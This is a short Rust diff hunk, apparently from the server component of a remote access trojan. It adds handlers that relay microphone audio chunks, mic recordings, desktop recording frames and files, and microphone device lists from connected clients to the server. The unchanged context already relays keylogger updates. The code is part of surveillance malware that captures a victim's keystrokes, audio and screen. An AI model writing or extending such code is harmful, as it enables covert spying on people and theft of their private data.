@@ -185,6 +185,31 @@ impl ClientReaderWrapper {
                     .await;
             }
 
+            MicAudioChunk(chunk) => {
+                self.send_server_packet(ServerCommand::MicAudioChunk(self.addr, chunk))
+                    .await;
+            }
+
+            MicRecordingFile(file_data) => {
+                self.send_server_packet(ServerCommand::MicRecordingFile(self.addr, file_data))
+                    .await;
+            }
+
+            DesktopRecordingPreviewFrame(frame) => {
+                self.send_server_packet(ServerCommand::DesktopRecordingPreviewFrame(self.addr, frame))
+                    .await;
+            }
+
+            DesktopRecordingFile(file_data) => {
+                self.send_server_packet(ServerCommand::DesktopRecordingFile(self.addr, file_data))
+                    .await;
+            }
+
+            MicDeviceList(devices) => {
+                self.send_server_packet(ServerCommand::MicDeviceList(self.addr, devices))
+                    .await;
+            }
+
             KeyloggerUpdate(update) => {
                 self.send_server_packet(ServerCommand::KeyloggerUpdate(self.addr, update))
                     .await;
